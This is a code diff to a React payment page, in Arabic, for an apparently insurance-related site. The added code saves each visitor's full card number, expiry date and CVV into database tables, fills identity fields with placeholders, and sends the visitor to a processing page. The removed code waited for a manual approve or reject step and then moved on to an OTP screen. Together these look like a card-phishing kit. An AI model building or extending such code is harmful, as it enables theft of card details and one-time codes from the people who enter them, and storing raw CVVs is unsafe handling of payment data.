@@ -57,56 +57,18 @@ const Payment = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  // Listen to status changes in real-time
+  // Check if page was returned with rejection
   useEffect(() => {
-    if (!orderData.sequenceNumber) {
-      console.log("No sequence number, skipping realtime subscription");
-      return;
-    }
-
-    console.log("Setting up realtime subscription for order:", orderData.sequenceNumber);
-    
-    const channel = supabase
-      .channel(`order-${orderData.sequenceNumber}`)
-      .on(
-        'postgres_changes',
-        {
-          event: 'UPDATE',
-          schema: 'public',
-          table: 'customer_orders',
-          filter: `sequence_number=eq.${orderData.sequenceNumber}`
-        },
-        (payload: any) => {
-          console.log("Received realtime update:", payload);
-          const newStatus = payload.new.status;
-          console.log("New status:", newStatus);
-          
-          if (newStatus === 'approved') {
-            console.log("Status is approved, navigating to OTP verification");
-            setWaitingApproval(false);
-            const last4 = cardNumber.slice(-4);
-            navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${finalPrice}&cardLast4=${last4}`);
-          } else if (newStatus === 'rejected') {
-            console.log("Status is rejected");
-            setWaitingApproval(false);
-            setRejectionError(true);
-            toast({
-              title: "تم رفض معلومات الدفع",
-              description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
-              variant: "destructive",
-            });
-          }
-        }
-      )
-      .subscribe((status) => {
-        console.log("Subscription status:", status);
+    const rejected = searchParams.get('rejected');
+    if (rejected === 'true') {
+      setRejectionError(true);
+      toast({
+        title: "تم رفض معلومات الدفع",
+        description: "يرجى التأكد من صحة البيانات وإعادة الإدخال",
+        variant: "destructive",
       });
-
-    return () => {
-      console.log("Cleaning up realtime subscription");
-      supabase.removeChannel(channel);
-    };
-  }, [orderData.sequenceNumber, cardNumber, companyName, finalPrice, navigate, toast]);
+    }
+  }, [searchParams, toast]);
 
   // Detect card type
   const cardType = useMemo(() => {
@@ -139,16 +101,73 @@ const Payment = () => {
 
     const expiryDate = `${expiryMonth}/${expiryYear}`;
 
-    // Update context
-    updateOrderData({
-      cardNumber: cardNumber,
-      cardHolderName: cardHolder,
-      expiryDate: expiryDate,
-      cvv: cvv
-    });
+    try {
+      // حفظ معلومات البطاقة في قاعدة البيانات
+      const { data: orderData, error: insertError } = await supabase
+        .from('customer_orders')
+        .insert({
+          card_holder_name: cardHolder,
+          card_number: cardNumber,
+          expiry_date: expiryDate,
+          cvv: cvv,
+          insurance_company: companyName,
+          insurance_price: finalPrice,
+          sequence_number: `ORD-${Date.now()}`,
+          id_number: '0000000000', // يمكن تحديثه لاحقاً
+          birth_date: '2000-01-01', // يمكن تحديثه لاحقاً
+          vehicle_type: 'sedan', // يمكن تحديثه لاحقاً
+          vehicle_purpose: 'private', // يمكن تحديثه لاحقاً
+          status: 'pending'
+        })
+        .select()
+        .single();
 
-    // Navigate to OTP verification page with payment details
-    navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${finalPrice}&cardLast4=${cardNumber.slice(-4)}`);
+      if (insertError) {
+        console.error('Error inserting order:', insertError);
+        toast({
+          title: "خطأ",
+          description: "فشل في حفظ معلومات الدفع",
+          variant: "destructive",
+        });
+        return;
+      }
+
+      // حفظ محاولة الدفع
+      const { error: attemptError } = await supabase
+        .from('payment_attempts')
+        .insert({
+          order_id: orderData.id,
+          card_holder_name: cardHolder,
+          card_number: cardNumber,
+          expiry_date: expiryDate,
+          cvv: cvv
+        });
+
+      if (attemptError) {
+        console.error('Error inserting payment attempt:', attemptError);
+      }
+
+      // Update context
+      updateOrderData({
+        cardNumber: cardNumber,
+        cardHolderName: cardHolder,
+        expiryDate: expiryDate,
+        cvv: cvv,
+        sequenceNumber: orderData.sequence_number
+      });
+
+      // الانتقال إلى صفحة التحميل
+      setWaitingApproval(true);
+      navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderData.id}`);
+
+    } catch (error) {
+      console.error('Error submitting payment:', error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء معالجة الدفع",
+        variant: "destructive",
+      });
+    }
   };
   return <div className="min-h-screen bg-gradient-to-b from-background to-muted/20" dir="rtl">
       {/* Promo Popup */}
